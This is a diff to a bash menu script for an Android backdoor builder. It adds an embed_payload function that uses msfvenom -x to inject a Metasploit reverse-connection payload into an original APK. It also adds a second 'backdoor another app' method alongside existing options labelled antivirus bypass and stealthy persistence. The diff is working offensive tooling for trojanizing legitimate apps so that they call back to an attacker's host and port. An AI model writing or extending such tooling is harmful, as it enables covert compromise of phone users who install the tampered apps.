@@ -273,6 +273,19 @@ function gen_payload()
  spinlong
  msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
+function embed_payload()
+{
+ echo -e $yellow ""
+ echo "[*] Embedding MSF Payload in Orginal APK..."
+ spinlong
+ msfvenom -x $original_path -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $path/$apk_name.apk > /dev/null 2>&1
+ spinlong
+ sleep 5
+ echo -e $yellow
+ echo "[✔] Done."
+ spinlong
+ echo 
+}
 
 #function update apktool
 function up_apktook()
@@ -321,7 +334,7 @@ function error()
  rc=$?
  if [ $rc != 0 ]; then
    echo -e $red ""
-   echo -e $red "【X】 Failed to Rebuild Backdoored APK【X】"
+   echo -e $red "【X】 Failed to Rebuild Backdoored APK."
    exit $rc
  fi
 }
@@ -330,7 +343,7 @@ function error0()
  rc=$?
  if [ $rc != 0 ]; then
    echo -e $red ""
-   echo -e $red "【X】 An Error Occured .Try Again【X】"
+   echo -e $red "【X】 An Error Occured .PLease Try Again."
    exit $rc
  fi
 }
@@ -618,9 +631,10 @@ clear
         echo -e "${Escape}"  # Reset color
         echo -e $green ""
         echo "[1] SIMPLE MSF PAYLOAD                                     "
-        echo "[2] BACKDOOR A REAL APP                 "
-        echo "[3] BYPASS AV (ICON CHANGE)                 "
-        echo "[4] STEALTHY PERSISTENCE                "
+        echo "[2] BACKDOOR ANOTHER APP [METHOD 1]              "
+        echo "[3] BACKDOOR ANOTHER APP [METHOD 2]              "
+        echo "[4] BYPASS AV (ICON CHANGE)                 "
+        echo "[5] STEALTHY PERSISTENCE                "
         echo "[q] QUIT                                        "
         read -p "[?] Select>: " option
         echo
@@ -645,7 +659,7 @@ clear
                 echo
                 clear
                 ;;
-            2)  echo -e $lightgreen "[✔] BACKDOOR A REAL APP"
+            2)  echo -e $lightgreen "[✔] BACKDOOR ANOTHER APP (METHOD 1)"
                 echo -e $green
                 get_lhost
                 get_lport
@@ -673,7 +687,28 @@ clear
                 echo ""
                 clear
                 ;;
-            3)  echo -e $lightgreen "[✔] BYPASS AV (ICON CHANGE)"
+            3)  echo -e $lightgreen "[✔] BACKDOOR ANOTHER APP (METHOD 2)"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                payload_name
+                get_payload
+                echo
+                orig_apk
+                echo
+                spinlong
+                up_apktook
+                embed_payload
+                echo 
+                mv $apk_name.apk $path/output > /dev/null 2>&1
+                error
+                sleep 2
+                echo ""
+                #clear
+                ;;
+
+            4)  echo -e $lightgreen "[✔] BYPASS AV (ICON CHANGE)"
                 echo -e $green
                 get_lhost
                 get_lport
@@ -700,7 +735,7 @@ clear
                 clear
                 ;;
 
-                4)  echo -e $green "[✔] STEALTHY PERSISTENCE"
+            5)  echo -e $green "[✔] STEALTHY PERSISTENCE"
                 echo -e $green
                 get_lhost
                 get_lport
